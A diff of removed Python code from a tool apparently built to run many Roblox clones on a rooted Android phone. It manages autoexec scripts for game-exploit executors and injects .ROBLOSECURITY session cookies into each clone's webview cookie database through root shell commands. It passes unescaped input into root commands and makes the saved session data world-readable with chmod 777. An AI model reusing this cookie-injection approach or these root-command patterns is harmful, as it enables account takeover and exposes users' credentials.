-        input("\nPress ENTER...")
-        return
-    
-    script_name = input("\n📌 Script name (without .lua): ").strip()
-    if not script_name:
-        add_log("Invalid script name")
-        input("\nPress ENTER...")
-        return
-    
-    if not script_name.endswith(".lua"):
-        script_name += ".lua"
-    
-    print("\n" + "=" * 70)
-    add_log("Adding script to all packages...")
-    print("=" * 70)
-    
-    success_count = 0
-    failed_count = 0
-    
-    for pkg, info in pkgs.items():
-        autoexec_dir = info.get("autoexec_dir", "")
-        
-        if not autoexec_dir:
-            add_log(f"❌ {info['username']}: No autoexec dir")
-            failed_count += 1
-            continue
-        
-        # Untuk ArceusX dan RonixExploit, gunakan root command
-        if EXECUTOR_TYPE in ["arceusx", "ronix"]:
-            # Buat folder dengan root
-            mkdir_cmd = f"mkdir -p {autoexec_dir}"
-            run_root_cmd(mkdir_cmd)
-            
-            # Write script dengan root
-            script_path = f"{autoexec_dir}/{script_name}"
-            escaped_content = script_content.replace("'", "'\"'\"'")
-            write_cmd = f"echo '{escaped_content}' > {script_path}"
-            run_root_cmd(write_cmd)
-            
-            # Set permissions
-            chmod_cmd = f"chmod 644 {script_path}"
-            run_root_cmd(chmod_cmd)
-            
-            add_log(f"✅ {info['username']}")
-            success_count += 1
-        else:
-            # Delta (per-package) dan Delta Global: gunakan Python biasa
-            if not os.path.exists(autoexec_dir):
-                try:
-                    os.makedirs(autoexec_dir, exist_ok=True)
-                except Exception as e:
-                    add_log(f"❌ {info['username']}: Can't create dir - {e}")
-                    failed_count += 1
-                    continue
-            
-            # Tulis script
-            script_path = os.path.join(autoexec_dir, script_name)
-            try:
-                with open(script_path, 'w') as f:
-                    f.write(script_content)
-                add_log(f"✅ {info['username']}")
-                success_count += 1
-            except Exception as e:
-                add_log(f"❌ {info['username']}: {e}")
-                failed_count += 1
-    
-    print("\n" + "=" * 70)
-    add_log(f"📊 RESULTS: {success_count} success, {failed_count} failed")
-    print("=" * 70)
-    input("\nPress ENTER...")
-
-def delete_script_from_all_packages():
-    """Hapus script dari semua package"""
-    global EXECUTOR_TYPE
-    
-    clear_screen()
-    print("=" * 70)
-    print("🗑️ DELETE SCRIPT FROM ALL PACKAGES")
-    print("=" * 70)
-    
-    pkgs = load_packages()
-    if not pkgs:
-        add_log("No packages found")
-        input("\nPress ENTER...")
-        return
-    
-    # Tampilkan script yang ada
-    print("\n📋 Available scripts:")
-    all_scripts = set()
-    
-    for pkg, info in pkgs.items():
-        scripts = list_executor_scripts(info)
-        all_scripts.update(scripts)
-    
-    if not all_scripts:
-        add_log("No scripts found in any package")
-        input("\nPress ENTER...")
-        return
-    
-    for i, script in enumerate(sorted(all_scripts), 1):
-        print(f"  {i}. {script}")
-    
-    # Pilih script
-    script_name = input("\n📌 Script name to delete: ").strip()
-    if not script_name:
-        add_log("Cancelled")
-        input("\nPress ENTER...")
-        return
-    
-    confirm = input(f"\n⚠️ Delete '{script_name}' from ALL packages? (y/n): ").strip().lower()
-    if confirm != 'y':
-        add_log("Cancelled")
-        input("\nPress ENTER...")
-        return
-    
-    # Hapus dari semua package
-    success_count = 0
-    not_found_count = 0
-    
-    for pkg, info in pkgs.items():
-        autoexec_dir = info.get("autoexec_dir", "")
-        if not autoexec_dir:
-            continue
-        
-        # Untuk ArceusX dan RonixExploit, gunakan root command
-        if EXECUTOR_TYPE in ["arceusx", "ronix"]:
-            script_path = f"{autoexec_dir}/{script_name}"
-            
-            # Check if exists
-            check_cmd = f"test -f {script_path} && echo 'exists'"
-            check_result = run_root_cmd(check_cmd)
-            
-            if check_result.strip() == "exists":
-                # Delete dengan root
-                rm_cmd = f"rm -f {script_path}"
-                run_root_cmd(rm_cmd)
-                add_log(f"✅ {info['username']}")
-                success_count += 1
-            else:
-                not_found_count += 1
-        else:
-            # Delta (per-package) dan Delta Global: gunakan Python biasa
-            script_path = os.path.join(autoexec_dir, script_name)
-            
-            if os.path.exists(script_path):
-                try:
-                    os.remove(script_path)
-                    add_log(f"✅ {info['username']}")
-                    success_count += 1
-                except Exception as e:
-                    add_log(f"❌ {info['username']}: {e}")
-            else:
-                not_found_count += 1
-    
-    print("\n" + "=" * 70)
-    add_log(f"📊 RESULTS: {success_count} deleted, {not_found_count} not found")
-    print("=" * 70)
-    input("\nPress ENTER...")
-
-def view_scripts_all_packages():
-    """Lihat semua script di semua package"""
-    clear_screen()
-    print("=" * 70)
-    print("👁️ VIEW SCRIPTS IN ALL PACKAGES")
-    print("=" * 70)
-    
-    pkgs = load_packages()
-    if not pkgs:
-        add_log("No packages found")
-        input("\nPress ENTER...")
-        return
-    
-    for i, (pkg, info) in enumerate(pkgs.items(), 1):
-        username = info['username']
-        scripts = list_executor_scripts(info)
-        
-        print(f"\n{i}. {username}")
-        if scripts:
-            for script in scripts:
-                print(f"   📜 {script}")
-        else:
-            print("   (No scripts)")
-    
-    print("\n" + "=" * 70)
-    input("\nPress ENTER...")
-
-def view_workspace_files():
-    """Lihat file di folder Workspace (untuk executor dengan global folder)"""
-    global EXECUTOR_TYPE
-    
-    clear_screen()
-    print("=" * 70)
-    print("📂 VIEW WORKSPACE FILES")
-    print("=" * 70)
-    
-    # Tentukan workspace_dir berdasarkan executor
-    if EXECUTOR_TYPE == "delta_global":
-        workspace_dir = DELTA_GLOBAL_WORKSPACE
-        executor_name = "Delta (Global Folder)"
-    elif EXECUTOR_TYPE == "arceusx":
-        workspace_dir = "/storage/emulated/0/Arceus X/Workspace"
-        executor_name = "Arceus X"
-    elif EXECUTOR_TYPE == "ronix":
-        workspace_dir = "/storage/emulated/0/RonixExploit/workspace"
-        executor_name = "RonixExploit"
-    else:
-        # Delta per-package: tampilkan workspace per akun
-        pkgs = load_packages()
-        if not pkgs:
-            add_log("No packages found")
-            input("\nPress ENTER...")
-            return
-        for i, (pkg, info) in enumerate(pkgs.items(), 1):
-            ws_dir = info.get("workspace_dir", "")
-            print(f"\n{i}. {info['username']} - {ws_dir}")
-            if ws_dir and os.path.isdir(ws_dir):
-                try:
-                    files = os.listdir(ws_dir)
-                    if files:
-                        for f in sorted(files):
-                            fpath = os.path.join(ws_dir, f)
-                            size = os.path.getsize(fpath) if os.path.isfile(fpath) else 0
-                            print(f"   📄 {f} ({size} bytes)")
-                    else:
-                        print("   (Kosong)")
-                except Exception as e:
-                    print(f"   ❌ Error: {e}")
-            else:
-                print("   ❌ Folder tidak ditemukan")
-        print("\n" + "=" * 70)
-        input("\nPress ENTER...")
-        return
-    
-    print(f"\n⚡ Executor : {executor_name}")
-    print(f"📂 Workspace: {workspace_dir}")
-    print("-" * 70)
-    
-    if os.path.isdir(workspace_dir):
-        try:
-            files = os.listdir(workspace_dir)
-            if files:
-                print(f"\n📋 {len(files)} file(s) ditemukan:\n")
-                for f in sorted(files):
-                    fpath = os.path.join(workspace_dir, f)
-                    size = os.path.getsize(fpath) if os.path.isfile(fpath) else 0
-                    print(f"   📄 {f} ({size} bytes)")
-            else:
-                print("\n   (Folder kosong)")
-        except Exception as e:
-            print(f"\n   ❌ Error membaca folder: {e}")
-    else:
-        print(f"\n   ❌ Folder tidak ditemukan: {workspace_dir}")
-    
-    print("\n" + "=" * 70)
-    
-    # Tawarkan opsi tambah file ke workspace
-    print("\n📌 Options:")
-    print("  1. Copy file ke Workspace")
-    print("  2. Hapus file dari Workspace")
-    print("  Enter. Kembali")
-    
-    choice = input("\nPilih: ").strip()
-    
-    if choice == "1":
-        src_path = input("📌 Path file sumber: ").strip()
-        if src_path and os.path.isfile(src_path):
-            try:
-                os.makedirs(workspace_dir, exist_ok=True)
-                fname = os.path.basename(src_path)
-                dst = os.path.join(workspace_dir, fname)
-                shutil.copy2(src_path, dst)
-                add_log(f"✅ File '{fname}' berhasil dicopy ke Workspace")
-            except Exception as e:
-                add_log(f"❌ Error: {e}")
-        else:
-            add_log("❌ File tidak ditemukan")
-    elif choice == "2":
-        if os.path.isdir(workspace_dir):
-            try:
-                files = [f for f in os.listdir(workspace_dir) if os.path.isfile(os.path.join(workspace_dir, f))]
-                if files:
-                    for i, f in enumerate(sorted(files), 1):
-                        print(f"  {i}. {f}")
-                    fname_in = input("\n📌 Nama file yang dihapus: ").strip()
-                    if fname_in:
-                        fpath_del = os.path.join(workspace_dir, fname_in)
-                        if os.path.exists(fpath_del):
-                            os.remove(fpath_del)
-                            add_log(f"✅ File '{fname_in}' dihapus dari Workspace")
-                        else:
-                            add_log("❌ File tidak ditemukan")
-                else:
-                    add_log("Workspace kosong")
-            except Exception as e:
-                add_log(f"❌ Error: {e}")
-    
-    input("\nPress ENTER...")
-
-
-def load_cookies():
-    """Baca cookie.txt, return list of cookie strings.
-    Support format manual: satu cookie per baris, abaikan baris kosong/komentar.
-    Handle BOM, \\r, spasi ekstra dari text editor Android."""
-    if not os.path.exists(COOKIE_FILE):
-        return []
-    try:
-        with open(COOKIE_FILE, "r", encoding="utf-8-sig") as f:
-            cookies = []
-            for line in f:
-                line = line.strip().replace("\r", "")
-                # Abaikan baris kosong, komentar, dan baris terlalu pendek
-                if not line or line.startswith("#"):
-                    continue
-                # Kalau ada spasi/tab di tengah cookie (copy-paste error), hapus
-                line = line.replace(" ", "").replace("\t", "")
-                # Minimal panjang cookie yang valid
-                if len(line) > 30:
-                    cookies.append(line)
-            return cookies
-    except Exception as e:
-        add_log(f"Cookie load error: {e}")
-        return []
-
-def save_cookies(cookies):
-    """Tulis list cookie ke cookie.txt"""
-    try:
-        with open(COOKIE_FILE, "w") as f:
-            for cookie in cookies:
-                f.write(cookie + "\n")
-        add_log(f"✅ {len(cookies)} cookie(s) saved")
-    except Exception as e:
-        add_log(f"Cookie save error: {e}")
-
-def load_cookie_map():
-    """Load mapping cookie index -> package"""
-    if not os.path.exists(COOKIE_MAP_FILE):
-        return {}
-    try:
-        with open(COOKIE_MAP_FILE, "r") as f:
-            return json.load(f)
-    except Exception:
-        return {}
-
-def save_cookie_map(cmap):
-    """Save mapping cookie index -> package"""
-    try:
-        with open(COOKIE_MAP_FILE, "w") as f:
-            json.dump(cmap, f, indent=2)
-    except Exception as e:
-        add_log(f"Cookie map save error: {e}")
-
-def validate_cookie(cookie):
-    """Validasi cookie via Roblox API. Return (user_id, username) atau None"""
-    try:
-        import urllib.request
-        import urllib.error
-        req = urllib.request.Request(
-            "https://users.roblox.com/v1/users/authenticated",
-            headers={"Cookie": f".ROBLOSECURITY={cookie}"}
-        )
-        with urllib.request.urlopen(req, timeout=10) as resp:
-            data = json.loads(resp.read().decode())
-            if data.get("id"):
-                return (data["id"], data.get("name", "Unknown"))
-    except urllib.error.HTTPError:
-        return None
-    except Exception as e:
-        add_log(f"Cookie validate error: {e}")
-    return None
-
-def get_cookie_db_path(package):
-    """Return path ke Cookies SQLite database untuk package"""
-    return f"/data/data/{package}/app_webview/Default/Cookies"
-
-def get_pkg_owner(package):
-    """Dapatkan uid:gid owner dari app data"""
-    out = run_root_cmd(f"stat -c '%U:%G' /data/data/{package}")
-    if out and ":" in out:
-        return out.strip()
-    # Fallback: coba ls
-    out = run_root_cmd(f"ls -ld /data/data/{package}")
-    if out:
-        parts = out.split()
-        if len(parts) >= 4:
-            return f"{parts[2]}:{parts[3]}"
-    return None
-
-BACKUP_DIR = "/sdcard/download/bangova"
-
-def get_app_storage_path(package):
-    """Return path ke appStorage.json untuk package"""
-    return f"/data/data/{package}/files/appData/LocalStorage/appStorage.json"
-
-def get_backup_app_storage_path():
-    """Return path backup appStorage.json"""
-    return f"{BACKUP_DIR}/appStorage.json"
-
-def update_app_storage(package, user_id, username, display_name):
-    """Update appStorage.json dengan data akun baru"""
-    app_storage_path = get_app_storage_path(package)
-    backup_app_storage = get_backup_app_storage_path()
-    tmp_path = f"/data/local/tmp/appStorage_{package.split('.')[-1]}.json"
-    owner = get_pkg_owner(package)
-
-    if not run_root_cmd(f"ls {app_storage_path}"):
-        if run_root_cmd(f"ls {backup_app_storage}"):
-            run_root_cmd(f"mkdir -p {os.path.dirname(app_storage_path)}")
-            run_root_cmd(f"cp -a {backup_app_storage} {app_storage_path}")
-            if owner:
-                run_root_cmd(f"chown {owner} {app_storage_path}")
-            run_root_cmd(f"chmod 660 {app_storage_path}")
-            add_log(f"📋 Restored appStorage.json from backup for {package}")
-        else:
-            add_log(f"⚠️ appStorage.json not found for {package}, skipped")
-            return True
-
-    run_root_cmd(f"cp {app_storage_path} {tmp_path}")
-    run_root_cmd(f"chmod 666 {tmp_path}")
-
-    if not run_root_cmd(f"ls {tmp_path}"):
-        add_log(f"❌ Failed to copy appStorage.json to tmp")
-        return False
-
-    try:
-        with open(tmp_path, "r", encoding="utf-8") as f:
-            data = json.load(f)
-
-        user_id_str = str(user_id)
-        username_str = str(username or "")
-        display_name_str = str(display_name or username or "")
-
-        old_user_id = str(data.get("UserId", ""))
-        old_username = str(data.get("Username", ""))
-        old_display_name = str(data.get("DisplayName", ""))
-        old_credential_value = str(data.get("CredentialValue", ""))
-
-        data["Username"] = username_str
-        data["UserId"] = user_id_str
-        data["DisplayName"] = display_name_str
-        data["CredentialValue"] = username_str
-
-        player_blob_raw = data.get("PlayerHydrationBlob")
-        if isinstance(player_blob_raw, str) and player_blob_raw.strip():
-            try:
-                player_blob = json.loads(player_blob_raw)
-                if isinstance(player_blob, dict):
-                    player_blob["userId"] = user_id_str
-                    if "displayName" in player_blob:
-                        player_blob["displayName"] = display_name_str
-                    if "name" in player_blob:
-                        player_blob["name"] = username_str
-                    if "username" in player_blob:
-                        player_blob["username"] = username_str
-                    data["PlayerHydrationBlob"] = json.dumps(player_blob, separators=(",", ":"))
-            except Exception:
-                updated_blob = player_blob_raw
-                if old_user_id:
-                    updated_blob = updated_blob.replace(f'"userId":"{old_user_id}"', f'"userId":"{user_id_str}"').replace(old_user_id, user_id_str)
-                if old_username:
-                    updated_blob = updated_blob.replace(old_username, username_str)
-                if old_display_name:
-                    updated_blob = updated_blob.replace(old_display_name, display_name_str)
-                data["PlayerHydrationBlob"] = updated_blob
-
-        app_config = data.get("AppConfiguration")
-        if isinstance(app_config, dict):
-            new_config = {}
-            for key, value in app_config.items():
-                new_key = key
-                if isinstance(key, str) and key.startswith("GUAC:") and ":app-policy" in key:
-                    parts = key.split(":")
-                    if len(parts) >= 3:
-                        parts[1] = user_id_str
-                        new_key = ":".join(parts)
-
-                if isinstance(value, str):
-                    updated_value = value
-                    if old_user_id:
-                        updated_value = updated_value.replace(old_user_id, user_id_str)
-                    new_config[new_key] = updated_value
-                else:
-                    new_config[new_key] = value
-            data["AppConfiguration"] = new_config
-        elif isinstance(app_config, str) and app_config:
-            if old_user_id:
-                data["AppConfiguration"] = app_config.replace(f"GUAC:{old_user_id}:app-policy", f"GUAC:{user_id_str}:app-policy").replace(old_user_id, user_id_str)
-
-        prev_accounts_raw = data.get("PreviousAccountsList")
-        if isinstance(prev_accounts_raw, str) and prev_accounts_raw.strip():
-            try:
-                prev_accounts = json.loads(prev_accounts_raw)
-                if isinstance(prev_accounts, list):
-                    for item in prev_accounts:
-                        if isinstance(item, dict):
-                            if "UserId" in item:
-                                item["UserId"] = user_id_str
-                            if "Username" in item:
-                                item["Username"] = username_str
-                            if "DisplayName" in item:
-                                item["DisplayName"] = display_name_str
-                            if "CredentialValue" in item:
-                                item["CredentialValue"] = username_str
-                    data["PreviousAccountsList"] = json.dumps(prev_accounts, separators=(",", ":"))
-            except Exception:
-                updated_prev = prev_accounts_raw
-                if old_user_id:
-                    updated_prev = updated_prev.replace(old_user_id, user_id_str)
-                if old_username:
-                    updated_prev = updated_prev.replace(old_username, username_str)
-                if old_display_name:
-                    updated_prev = updated_prev.replace(old_display_name, display_name_str)
-                if old_credential_value:
-                    updated_prev = updated_prev.replace(old_credential_value, username_str)
-                data["PreviousAccountsList"] = updated_prev
-
-        for key, value in list(data.items()):
-            if isinstance(value, str):
-                updated_value = value
-                if old_user_id:
-                    updated_value = updated_value.replace(old_user_id, user_id_str)
-                if old_username:
-                    updated_value = updated_value.replace(old_username, username_str)
-                if old_display_name:
-                    updated_value = updated_value.replace(old_display_name, display_name_str)
-                if old_credential_value:
-                    updated_value = updated_value.replace(old_credential_value, username_str)
-                data[key] = updated_value
-
-        data["Username"] = username_str
-        data["UserId"] = user_id_str
-        data["DisplayName"] = display_name_str
-        data["CredentialValue"] = username_str
-
-        with open(tmp_path, "w", encoding="utf-8") as f:
-            json.dump(data, f, ensure_ascii=False, separators=(",", ":"))
-
-    except Exception as e:
-        add_log(f"❌ appStorage update error: {e}")
-        run_root_cmd(f"rm {tmp_path}")
-        return False
-
-    run_root_cmd(f"cp {tmp_path} {app_storage_path}")
-    if owner:
-        run_root_cmd(f"chown {owner} {app_storage_path}")
-    run_root_cmd(f"chmod 660 {app_storage_path}")
-    run_root_cmd(f"rm {tmp_path}")
-
-    if not run_root_cmd(f"ls {app_storage_path}"):
-        add_log(f"❌ Failed to restore updated appStorage.json")
-        return False
-
-    add_log(f"✅ appStorage.json updated for {package}")
-    return True
-
-def backup_webview_from_pkg(package):
-    """
-    Backup seluruh app_webview/ dari package ke /sdcard/download/bangova/
-    Cukup dilakukan 1x dari package yang sudah login.
-    """
-    src_dir = f"/data/data/{package}/app_webview"
-    app_storage = get_app_storage_path(package)
-    backup_app_storage = get_backup_app_storage_path()
-    
-    # Cek source ada
-    check = run_root_cmd(f"ls {src_dir}/Default/Cookies")
-    if not check:
-        add_log(f"❌ {package} tidak punya webview data")
-        return False
-
-    # Buat folder backup
-    run_root_cmd(f"mkdir -p {BACKUP_DIR}")
-
-    # Hapus backup lama
-    run_root_cmd(f"rm -rf {BACKUP_DIR}/app_webview")
-    run_root_cmd(f"rm -f {backup_app_storage}")
-
-    # Copy seluruh folder
-    add_log(f"📦 Backing up webview data from {package}...")
-    run_root_cmd(f"cp -a {src_dir} {BACKUP_DIR}/app_webview")
-
-    # Copy appStorage.json jika ada
-    print(f"  Checking appStorage.json at: {app_storage}")
-    app_storage_check = run_root_cmd(f"ls {app_storage}")
-    if app_storage_check:
-        print(f"  Found! Copying...")
-        run_root_cmd(f"cp {app_storage} {backup_app_storage}")
-        run_root_cmd(f"chmod 666 {backup_app_storage}")
-    else:
-        # Coba cari di package lain yang punya appStorage.json
-        print(f"  Not found in {package}, searching other packages...")
-        pkgs = load_packages()
-        found_app_storage = False
-        for other_pkg in pkgs:
-            if other_pkg == package:
-                continue
-            other_path = get_app_storage_path(other_pkg)
-            if run_root_cmd(f"ls {other_path}"):
-                print(f"  Found in {other_pkg}! Copying...")
-                run_root_cmd(f"cp {other_path} {backup_app_storage}")
-                run_root_cmd(f"chmod 666 {backup_app_storage}")
-                found_app_storage = True
-                break
-        if not found_app_storage:
-            print(f"  ⚠️ appStorage.json not found in any package")
-
-    # Set permission agar bisa dibaca oleh Python
-    run_root_cmd(f"chmod -R 777 {BACKUP_DIR}")
-
-    # Verify
-    check = run_root_cmd(f"ls {BACKUP_DIR}/app_webview/Default/Cookies")
-    check_app = os.path.exists(backup_app_storage)
-    if check:
-        print(f"\n  ✅ Backup saved:")
-        print(f"     Cookies.db: ✅")
-        print(f"     appStorage.json: {'✅' if check_app else '❌ MISSING'}")
-        return True
-    else:
-        add_log(f"❌ Backup failed")
-        return False
-
-def has_backup():
-    """Cek apakah backup bangova sudah ada"""
-    check = run_root_cmd(f"ls {BACKUP_DIR}/app_webview/Default/Cookies")
-    return bool(check)
-
-def restore_webview_to_pkg(dest_pkg):
-    """Restore backup app_webview/ dari bangova ke package"""
-    src_dir = f"{BACKUP_DIR}/app_webview"
-    dst_dir = f"/data/data/{dest_pkg}/app_webview"
-    backup_app_storage = get_backup_app_storage_path()
-    dst_app_storage = get_app_storage_path(dest_pkg)
-    dst_local_storage_dir = os.path.dirname(dst_app_storage)
-
-    if not has_backup():
-        add_log(f"❌ Backup tidak ditemukan di {BACKUP_DIR}")
-        return False
-
-    # Hapus webview lama di dest
-    run_root_cmd(f"rm -rf {dst_dir}")
-
-    # Copy dari backup
-    run_root_cmd(f"cp -a {src_dir} {dst_dir}")
-
-    # Fix ownership
-    owner = get_pkg_owner(dest_pkg)
-    if owner:
-        run_root_cmd(f"chown -R {owner} {dst_dir}")
-
-    # Restore appStorage.json jika ada di backup
-    if run_root_cmd(f"ls {backup_app_storage}"):
-        run_root_cmd(f"mkdir -p {dst_local_storage_dir}")
-        run_root_cmd(f"cp -a {backup_app_storage} {dst_app_storage}")
-        if owner:
-            run_root_cmd(f"chown {owner} {dst_app_storage}")
-        run_root_cmd(f"chmod 660 {dst_app_storage}")
-
-    # Verify
-    check = run_root_cmd(f"ls {dst_dir}/Default/Cookies")
-    if check:
-        return True
-    else:
-        add_log(f"❌ Restore failed for {dest_pkg}")
-        return False
-
-def find_source_package():
-    """Cari package yang sudah login (punya Cookie DB dengan .ROBLOSECURITY)"""
-    pkgs = load_packages()
-    for pkg, info in pkgs.items():
-        db_path = get_cookie_db_path(pkg)
-        check = run_root_cmd(f"ls {db_path}")
-        if check:
-            return pkg
-    all_pkgs = get_roblox_packages()
-    for pkg in all_pkgs:
-        db_path = get_cookie_db_path(pkg)
-        check = run_root_cmd(f"ls {db_path}")
-        if check:
-            return pkg
-    return None
-
-def inject_cookie_to_db(db_path, cookie):
-    """Inject cookie ke SQLite database yang sudah ada di tmp"""
-    try:
-        conn = sqlite3.connect(db_path)
-        c = conn.cursor()
-
-        # Cek tabel cookies ada
-        c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
-        if not c.fetchone():
-            add_log(f"❌ Table 'cookies' not found")
-            conn.close()
-            return False
-
-        # Timestamps (microseconds)
-        now = int(time.time() * 1_000_000)
-        expires = int((time.time() + 86400 * 365) * 1_000_000)
-
-        # Delete existing .ROBLOSECURITY
-        c.execute("DELETE FROM cookies WHERE host_key='.roblox.com' AND name='.ROBLOSECURITY'")
-        c.execute("DELETE FROM cookies WHERE host_key='auth.roblox.com' AND name='.ROBLOSECURITY'")
-
-        # Insert new cookie
-        c.execute("""
-            INSERT INTO cookies (
-                creation_utc, host_key, name, value, path, expires_utc,
-                is_secure, is_httponly, last_access_utc, has_expires,
-                is_persistent, priority, encrypted_value, samesite, source_scheme
-            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        """, (
-            now, ".roblox.com", ".ROBLOSECURITY", cookie, "/", expires,
-            1, 1, now, 1, 1, 1, b"", -1, 0
-        ))
-
-        conn.commit()
-        conn.close()
-        return True
-
-    except Exception as e:
-        add_log(f"❌ SQLite error: {e}")
-        try:
-            conn.close()
-        except:
-            pass
-        return False
-
-def inject_cookie_to_pkg(package, cookie, launch_after=False, game_id="", private_link=""):
-    """
-    Inject .ROBLOSECURITY cookie ke Roblox package.
-    Flow:
-    1. Force stop app
-    2. Copy SELURUH app_webview/ dari bangova ke pkg (termasuk LocalStorage, IndexedDB, dll)
-    3. Edit Cookies.db di bangova/tmp/ → timpa ke pkg
-    4. Copy appStorage.json dari bangova → edit → timpa ke pkg
-    5. Launch app
-    """
-    pkg_short = package.split('.')[-1]
-    print(f"\n    --- [{pkg_short}] START ---")
-
-    # Cek backup
-    print(f"    [1] Checking backup...", end=" ", flush=True)
-    if not has_backup():
-        print(f"❌ GAGAL")
-        print(f"    Backup bangova belum ada!")
-        print(f"    Jalankan: Menu 13 → opsi 4 (Backup Session)")
-        return False
-    print(f"OK")
-
-    db_path = get_cookie_db_path(package)
-    app_storage_path = get_app_storage_path(package)
-    backup_db = f"{BACKUP_DIR}/app_webview/Default/Cookies"
-    backup_webview = f"{BACKUP_DIR}/app_webview"
-    backup_app_storage = get_backup_app_storage_path()
-
-    # Folder tmp di sdcard (Python bisa akses)
-    tmp_dir = f"{BACKUP_DIR}/tmp"
-    tmp_db = os.path.join(tmp_dir, f"Cookies_{pkg_short}.db")
-    tmp_app_storage = os.path.join(tmp_dir, f"appStorage_{pkg_short}.json")
-
-    print(f"    [2] Creating tmp dir...", end=" ", flush=True)
-    try:
-        os.makedirs(tmp_dir, exist_ok=True)
-        print(f"OK")
-    except Exception as e:
-        print(f"❌ {e}")
-        return False
-
-    # Validasi cookie (non-blocking)
-    print(f"    [3] Validating cookie...", end=" ", flush=True)
-    user_id = None
-    username = None
-    display_name = None
-    try:
-        cookie_info = validate_cookie(cookie)
-        if cookie_info:
-            user_id, username = cookie_info
-            display_name = username
-            print(f"✅ {username} (ID: {user_id})")
-        else:
-            print(f"⚠️ Failed (will inject anyway)")
-    except Exception as e:
-        print(f"⚠️ Error: {e} (will inject anyway)")
-
-    # Step 1: Force stop
-    print(f"    [4] Force stopping {pkg_short}...", end=" ", flush=True)
-    run_root_cmd(f"am force-stop {package}")
-    time.sleep(1)
-    print(f"OK")
-
-    # Step 2: Copy SELURUH app_webview/ dari bangova ke pkg
-    print(f"    [5] Copying entire app_webview/ to pkg...", end=" ", flush=True)
-    dst_webview = f"/data/data/{package}/app_webview"
-    run_root_cmd(f"rm -rf {dst_webview}")
-    run_root_cmd(f"cp -a {backup_webview} {dst_webview}")
-    owner = get_pkg_owner(package)
-    if owner:
-        run_root_cmd(f"chown -R {owner} {dst_webview}")
-    verify_webview = run_root_cmd(f"ls {dst_webview}/Default/Cookies")
-    if verify_webview:
-        print(f"OK (owner={owner})")
-    else:
-        print(f"❌ Failed to copy app_webview")
-        return False
-
-    # Step 3: Edit Cookies.db — copy ke tmp, edit, timpa balik ke pkg
-    print(f"    [6] Copying Cookies.db to tmp...", end=" ", flush=True)
-    try:
-        with open(backup_db, "rb") as src:
-            with open(tmp_db, "wb") as dst:
-                dst.write(src.read())
-        print(f"OK ({os.path.getsize(tmp_db)}b)")
-    except Exception as e:
-        print(f"❌ {e}")
-        return False
-
-    print(f"    [7] Editing cookie in tmp DB...", end=" ", flush=True)
-    if not inject_cookie_to_db(tmp_db, cookie):
-        print(f"❌ inject_cookie_to_db failed")
-        try:
-            os.remove(tmp_db)
-        except:
-            pass
-        return False
-    print(f"OK")
-
-    print(f"    [8] Replacing Cookies.db in pkg...", end=" ", flush=True)
-    run_root_cmd(f"cp {tmp_db} {db_path}")
-    if owner:
-        run_root_cmd(f"chown {owner} {db_path}")
-    run_root_cmd(f"chmod 600 {db_path}")
-    verify_db = run_root_cmd(f"ls {db_path}")
-    print(f"OK" if verify_db else f"⚠️ verify failed")
-    try:
-        os.remove(tmp_db)
-    except:
-        pass
-
-    # Step 4: appStorage.json — copy ke tmp, edit, timpa ke pkg
-    if os.path.exists(backup_app_storage):
-        print(f"    [9] Copying appStorage.json to tmp...", end=" ", flush=True)
-        try:
-            with open(backup_app_storage, "rb") as src:
-                with open(tmp_app_storage, "wb") as dst:
-                    dst.write(src.read())
-            print(f"OK")
-        except Exception as e:
-            print(f"❌ {e}")
-            tmp_app_storage = None
-
-        if tmp_app_storage and user_id and username:
-            print(f"    [10] Editing appStorage.json...", end=" ", flush=True)
-            try:
-                with open(tmp_app_storage, "r", encoding="utf-8") as f:
-                    data = json.load(f)
-
-                user_id_str = str(user_id)
-                old_user_id = str(data.get("UserId", ""))
-                old_username = str(data.get("Username", ""))
-                old_display_name = str(data.get("DisplayName", ""))
-                old_credential = str(data.get("CredentialValue", ""))
-
-                for key, value in list(data.items()):
-                    if isinstance(value, str) and value:
-                        updated = value
-                        if old_user_id and old_user_id not in ("", "-1"):
-                            updated = updated.replace(old_user_id, user_id_str)
-                        if old_username:
-                            updated = updated.replace(old_username, username)
-                        if old_display_name and old_display_name != old_username:
-                            updated = updated.replace(old_display_name, display_name)
-                        if old_credential and old_credential not in ("", old_username):
-                            updated = updated.replace(old_credential, username)
-                        data[key] = updated
-
-                data["Username"] = username
-                data["UserId"] = user_id_str
-                data["DisplayName"] = display_name
-                data["CredentialValue"] = username
-
-                with open(tmp_app_storage, "w", encoding="utf-8") as f:
-                    json.dump(data, f, ensure_ascii=False, separators=(",", ":"))
-                print(f"OK ({old_username}→{username})")
-            except Exception as e:
-                print(f"⚠️ {e} (using backup as-is)")
-        elif tmp_app_storage:
-            print(f"    [10] Skipping appStorage edit (no user info)")
-
-        if tmp_app_storage and os.path.exists(tmp_app_storage):
-            print(f"    [11] Replacing appStorage in pkg...", end=" ", flush=True)
-            app_storage_dir = os.path.dirname(app_storage_path)
-            run_root_cmd(f"mkdir -p {app_storage_dir}")
-            run_root_cmd(f"cp {tmp_app_storage} {app_storage_path}")
-            if owner:
-                run_root_cmd(f"chown {owner} {app_storage_path}")
-            run_root_cmd(f"chmod 660 {app_storage_path}")
-            verify_as = run_root_cmd(f"ls {app_storage_path}")
-            print(f"OK" if verify_as else f"⚠️ verify failed")
-            try:
-                os.remove(tmp_app_storage)
-            except:
-                pass
-    else:
-        print(f"    [9] No appStorage.json in backup, skipped")
-
-    print(f"    ✅ Done: {pkg_short}")
-
-    # Step 5: Launch app (hanya buka Roblox home)
-    if launch_after:
-        print(f"    [12] Launching {pkg_short}...", end=" ", flush=True)
-        splash_cmds = [
-            f"am start -n {package}/com.roblox.client.startup.ActivitySplash",
-            f"am start -n {package}/.startup.ActivitySplash",
-            f"monkey -p {package} -c android.intent.category.LAUNCHER 1"
-        ]
-        launched = False
-        for i, cmd in enumerate(splash_cmds):
-            run_root_cmd(cmd)
-            time.sleep(3)
-            if is_app_running(package):
-                print(f"OK (method {i+1})")
-                launched = True
-                break
-        if not launched:
-            print(f"⚠️ All methods tried")
-
-    print(f"    --- [{pkg_short}] END ---\n")
-    return True
-
-def manage_cookies_menu():
-    """Menu Manage Cookies — add, delete, view cookies"""
-    while True:
-        clear_screen()
-        cookies = load_cookies()
-
-        print("=" * 70)
-        print("🍪 MANAGE COOKIES")
-        print("=" * 70)
-        print(f"📄 File: {COOKIE_FILE}")
-        print(f"🍪 Total cookies: {len(cookies)}")
-        print()
-
-        if cookies:
-            print("📋 Cookie List:")
-            print("-" * 70)
